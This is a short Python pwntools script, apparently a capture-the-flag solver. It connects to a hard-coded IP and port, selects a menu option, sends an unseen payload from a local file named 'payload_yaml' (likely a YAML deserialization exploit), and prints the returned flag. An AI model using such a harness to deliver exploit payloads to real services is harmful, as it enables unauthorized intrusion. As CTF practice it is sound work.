#!/usr/bin/python3
from pwn import *
from base64 import b64encode

context.log_level = 'error'

data = open("payload_yaml", 'r').read()
#print(data)

c = connect("139.59.178.162", 31680)

c.recv()
c.sendline(b"2")
c.recv()

c.sendline(data.encode())

c.recv()
flag = c.recv()

print(flag.decode().strip())
